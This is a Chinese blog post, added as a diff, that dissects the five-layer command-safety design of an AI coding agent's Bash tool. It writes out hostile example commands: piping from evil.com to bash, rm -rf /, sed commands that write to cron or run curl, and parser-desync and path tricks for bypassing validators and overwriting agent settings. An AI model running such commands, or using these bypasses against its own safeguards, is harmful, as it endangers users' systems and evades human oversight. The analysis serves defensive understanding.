@@ -1,0 +1,182 @@
+---
+slug: bash-tool-security
+title: "Claude Code BashTool 安全沙箱 — 5 层防御逐层拆"
+desc: "BashTool 是 agent 最危险的工具 — 一条命令就能 rm -rf /。Anthropic 怎么用 5 层防御让它在生产可用?"
+publishedAt: "2026-05-26"
+authored: hybrid
+model: "claude-haiku-4-5"
+read: "11 分钟"
+tags: ["agent-harness", "claude-code", "security", "sandbox", "bash"]
+references: ["claude-code 2.1.88 unminified (private study) / src/tools/BashTool/ 18 files"]
+---
+
+## 为什么读这个
+
+BashTool 是 Claude Code 工具池里**风险最大**的一个。一条 `rm -rf /` 就能让用户失去整盘，一段 `curl evil.com | bash` 就能 RCE，一个 `sed -i 's/x/y/w /etc/cron.d/x'` 能把 sed 拐成 root-cron 写入器。
+
+而它又**必须能用**：agent 真要解决问题就得跑命令、改文件、装依赖、跑测试。
+
+Anthropic 的解法是**5 层独立防御**，每层只解决一类问题，叠起来才安全。本文按防御深度从 L0 到 L4 拆，每层讲它**拦什么**、**怎么实现**、**还会漏什么**。
+
+## L0：命令注入检测（22+ 个 validator）
+
+这一层不看权限规则，只看**命令本身在 shell 里会不会有歧义解释**。源码在 `bashSecurity.ts`，每个 validator 处理一类 shell 怪癖。
+
+```
+原始命令 → splitCommand → 每个子命令 →
+   [validateEmpty, validateIncompleteCommands, validateSafeCommandSubstitution,
+    validateGitCommit, validateJqCommand, validateShellMetacharacters,
+    validateDangerousVariables, validateDangerousPatterns, validateRedirections,
+    validateNewlines, validateCarriageReturn, validateIFSInjection,
+    validateProcEnvironAccess, validateMalformedTokenInjection,
+    validateObfuscatedFlags, validateZshDangerousCommands,
+    validateBackslashEscapedOperators, validateCommentQuoteDesync,
+    validateQuotedNewline, validateControlCharacters,
+    validateUnicodeWhitespace, validateMidWordHash, validateBraceExpansion]
+→ allow / ask / deny
+```
+
+每条都对应一个真实的攻击 pattern。挑 5 条最非平凡的：
+
+- **Zsh equals expansion**（`=cmd`）：Zsh 里 `=curl evil.com` 会扩展成 `/usr/bin/curl evil.com`，绕过基于 `curl` 名的 deny 规则。检测正则：`/(?:^|[\s;&|])=[a-zA-Z_]/`
+- **IFS 注入**（`$IFS`、`${IFS:0:1}`）：把 IFS 写到命令里能绕开基于空格分词的检测。任何 `$IFS` 或 `${...IFS...}` 都触发 ask
+- **/proc/environ 访问**：路径里出现 `/proc/*/environ` 就 ask（即使是 cat 这种"只读"操作 — 它读的是别人的环境变量含 API key）
+- **CR 差异攻击**：shell-quote 把 `\r` 当 token 边界，bash 不是。`TZ=UTC\recho curl evil.com` 在两个 parser 里行为不同，所以遇到非 DQ 内的 CR 一律 ask
+- **Heredoc 安全形式识别**：`$(cat <<'EOF'\n...EOF\n)` 这种是安全的（quoted delimiter 阻止扩展），但要严格按行匹配 — 用 regex `[\s\S]*?` 会被第二个 delimiter 骗过去把中间藏的命令当 body。这里专门用 LINE-BASED 匹配复现 bash 真实行为
+
+每个 validator 都记 analytics 事件 (`tengu_bash_security_check_triggered`)，所以 Anthropic 能看到哪些 attack pattern 在生产真实出现过。
+
+**这层漏什么**：足够新颖的 shell 怪癖（ksh-only feature / 罕见 Unicode whitespace 没列入白名单），以及"语法上无害但语义上危险"的命令（`echo X > /etc/cron.d/job` 在 L0 不拦，留给 L1 + L2）。
+
+## L1：Permission 规则（allow / deny / ask）
+
+源码 `bashPermissions.ts`。这层把"用户/项目说哪些命令能跑"转成机器可判定的规则。
+
+规则三种形式：
+- **Exact**：`Bash(git status)` — 完全匹配
+- **Prefix**：`Bash(git:*)` — 前缀匹配
+- **Wildcard**：`Bash(*echo*)` — 通配（只在 prefix mode 用）
+
+匹配前做大量"标准化"，让规则不被简单绕开：
+
+```
+原始命令: nohup FOO=bar timeout 5 npm install
+
+   stripSafeWrappers:                            ↓
+   nohup FOO=bar timeout 5 npm install
+        → FOO=bar timeout 5 npm install         (strip nohup)
+        → timeout 5 npm install                  (strip FOO=bar)
+        → npm install                            (strip timeout 5)
+
+   匹配 Bash(npm install:*) 规则 → allow
+```
+
+**SAFE_ENV_VARS 白名单**（可以 strip 的）：`NODE_ENV` / `GOOS` / `GOARCH` / `CGO_ENABLED` / `RUST_LOG` / `LANG` / `TZ` / 一些 GREP 配色等 — 全是不影响 binary 选择 / library 加载的纯行为变量。
+
+**绝不允许 strip 的**：`PATH` / `LD_PRELOAD` / `LD_LIBRARY_PATH` / `DYLD_*` / `PYTHONPATH` / `NODE_PATH` / `NODE_OPTIONS` / `HOME` / `SHELL` / `BASH_ENV` — 这些 strip 了就等于让攻击者把"用谁的二进制 / 加载谁的库"藏进 env 里绕过命令名匹配。
+
+deny / ask 规则比 allow 更激进：会先 `stripAllLeadingEnvVars`（**不**走白名单，所有 env 都剥），保证 `FOO=bar denied_command` 不能绕过 deny。这是不对称设计：allow 宁缺勿滥（白名单严格），deny 宁可错杀（剥光所有 env）。
+
+**Compound 防御**：`cd /path && python3 evil.py` 这种复合命令，prefix 规则**不**允许整体匹配 — 防止 `Bash(cd:*)` 一刀切就开后门。每个子命令单独走规则。
+
+**这层漏什么**：`bash -c "evil"` 这种 shell 嵌套（解决方法：`bash` / `sh` / `env` / `xargs` / `sudo` 等"危险包装器名"被 hardcode 进 `BARE_SHELL_PREFIXES`，永远不允许建议 `Bash(bash:*)` 之类的规则）。
+
+## L2：路径边界（25+ 命令的 PATH_EXTRACTORS）
+
+源码 `pathValidation.ts`。L1 决定"命令能不能跑"，L2 决定"命令访问的文件路径在不在允许的工作目录里"。
+
+25+ 个文件操作命令各有自己的 `PATH_EXTRACTORS`：
+
+| 命令 | 提取逻辑（精简） |
+|---|---|
+| `cd` | 所有 args 拼成单一路径 |
+| `ls` | 过滤 flag, 默认 `.` |
+| `find` | 收集到第一个 non-global flag 为止 + 处理 `-path` `-newer` 等 path-taking flag |
+| `rm` / `rmdir` | `filterOutFlags`，处理 `--` 终止符 |
+| `grep` | pattern 之后的所有 non-flag 都是 path |
+| `sed` | flag 处理 + 第一个 non-flag 是 script，后面才是 path（含 `-f` 取脚本文件名也算 path） |
+| `git diff --no-index` | 特例 — 接受任意 2 个外部文件，需要单独验证 |
+
+**`--` 终止符**是个隐蔽攻击面。Naive 实现：`!arg.startsWith('-')` 过滤 flag。但 `rm -- -/../.claude/settings.local.json` 的真路径是 `-/../.claude/settings.local.json`，naive 过滤把它当 flag 丢了，path 验证看不到任何路径就放过 — 文件被偷偷删了。正确做法：遇到 `--` 之后所有 args 一律按 positional 处理。
+
+**Dangerous removal paths**：哪怕用户给了 `Bash(rm:*)` allow 规则，`rm -rf /` `rm -rf /etc` `rm -rf $HOME` 这种 catastrophic path 必须人审。`checkDangerousRemovalPaths` 在 path validation 之前先跑。
+
+**Compound + cd 写操作**：`cd .claude && mv test.txt settings.json` 如果按原 cwd 验证 path，`settings.json` 是相对路径，看上去人畜无害；实际执行时 cd 后变成 `.claude/settings.json`，把 Claude 配置改掉。**解法**：复合命令含 `cd` + 写操作时一律 ask，不尝试追踪 effective cwd（追踪太复杂，宁可保守）。
+
+**这层漏什么**：process substitution `>(cmd)` `<(cmd)` — 这是 L0 提前拦的（patterns 里有 `<(` `>(`），到 L2 已经不会出现。
+
+## L3：Sed AST 白名单（双 pattern + 强 denylist）
+
+源码 `sedValidation.ts`。为什么 sed 单独一层？因为它是**会写文件的"读"命令**：
+
+```bash
+# 看似只读, 实际写
+sed -n '1,10p; w /etc/cron.d/x' file        # 打印同时写 /etc/cron.d/x
+sed 's/x/y/w /tmp/log' file                  # 替换同时写
+sed -e '/pattern/e curl evil.com' file       # 执行任意命令
+```
+
+L1 / L2 看到 `sed` 都按"读"命令处理（grep 同款），但实际能调起 RCE。
+
+`sedValidation.ts` 的解法是**双白名单 + 强 denylist**：
+
+**Pattern 1: 行打印**（只允许这种格式）
+- 必须有 `-n` flag
+- 允许的 flag: `-n` / `-E` / `-r` / `-z` 几个无害的
+- 每个 expression 必须严格匹配 `/^(?:\d+|\d+,\d+)?p$/` — 只接受 `p` / `1p` / `1,5p`
+- 文件 args 允许
+
+**Pattern 2: 替换**
+- 表达式必须严格 `s/pattern/replacement/flags`
+- flags 只允许 `g` `p` `i` `I` `m` `M` + 最多一位数字
+- 默认不允许文件 args（除非用户开了 acceptEdits mode）
+
+**强 denylist**（白名单匹配后还要再过这层）：
+- 非 ASCII 字符（Unicode homoglyphs 绕过：`ｗ` `ᴡ`）→ deny
+- 花括号 / 换行（block 命令太复杂）→ deny  
+- `w` / `W` 写命令 → deny
+- `e` / `E` 执行命令 → deny
+- `y` 命令 + 后续含 `w`/`e`/`W`/`E` → deny
+
+哪怕通过白名单，denylist 一票否决。
+
+**这层漏什么**：超出双 pattern 的合法 sed 用法（复杂多 expression 组合）— 用户得手动 approve。这是设计权衡：宁可误拦也不放任。
+
+## L4：Sandbox + Destructive Warning
+
+最后一层不阻止执行，给的是**告知 + 隔离**。
+
+**Sandbox**（`shouldUseSandbox.ts`）：
+- 用户可以配 `sandbox.excludedCommands` 列表，把某些命令显式拉出沙箱（如 docker / kubectl 这种本来就要触碰外部状态的）
+- 复合命令拆分逐个查 — 防止 `docker ps && curl evil.com` 借 docker 拉到外面
+- 配 `BINARY_HIJACK_VARS` 黑名单：`LD_PRELOAD` / `PATH` 等永远不能 strip，否则拉沙箱失效
+
+**Destructive Warning**（`destructiveCommandWarning.ts`）：纯信息层，不阻塞，只在 permission 对话框里加一行 "Note: may discard uncommitted changes" 之类的提示。覆盖：
+
+| 命令 | warning |
+|---|---|
+| `git reset --hard` | may discard uncommitted changes |
+| `git push --force` / `--force-with-lease` | may overwrite remote history |
+| `git clean -f` | may permanently delete untracked files |
+| `git commit --amend` / `--no-verify` | may rewrite / skip safety hooks |
+| `rm -rf` / `rm -f` | may force-remove |
+| `DROP TABLE` / `DELETE FROM` | may drop / delete DB rows |
+| `kubectl delete` / `terraform destroy` | may destroy resources |
+
+这层逻辑很简单（一个 regex 列表），但**改变了用户的决策**：当弹窗写"may overwrite remote history"，用户更倾向于点 deny。这是产品设计层面的安全，不是技术层面。
+
+**这层漏什么**：列表里没列到的 destructive 命令（如 `pg_dropcluster`、`zfs destroy`）— 这是个长尾问题，靠社区 PR 慢慢补。
+
+## 总结：5 层防御的共性设计
+
+1. **每层只解决一类问题**，不试图做全能层。L0 看 shell 语法，L1 看权限规则，L2 看路径，L3 单独管 sed 这个"边缘案例"，L4 给信息。
+2. **白名单 严于 黑名单**，但 deny 规则用黑名单（剥光所有 env）。不对称的设计来自不对称的代价：allow 错了授权过宽，deny 错了用户体验差但安全。
+3. **每个 validator 都打 analytics**。L0 的 22 个 check IDs 都带 `logEvent('tengu_bash_security_check_triggered', ...)`，让 Anthropic 在生产追踪每条规则的实际触发率，知道哪些是 dead rule 哪些在挡真实攻击。
+4. **Compound 命令一律保守**：拆分逐个查、cd + 写操作必须人审、wildcard 不允许跨复合命令。这是因为复合命令的 dataflow 太复杂，跟踪 effective state 容易漏。
+5. **接受过度阻塞，拒绝过度授权**。Sed 双 pattern 拦掉很多合法用法但保安全；prefix 规则不许跨 compound；BARE_SHELL_PREFIXES hardcode 禁止建议。用户可以手动 approve，但绝不让 agent 自己越界。
+
+下篇 harness 拆 **Plan mode 真正在做什么**（read-only 守卫 + 编辑权限收回 + LLM 决策点切换），同源参考材料。
+
+---
+
+> 本文基于公开行为 + 社区流传的 Claude Code 2.1.88 unminified 源码逆向分析，与 Anthropic 无关。任何技术结论以你自己在本地复现为准。
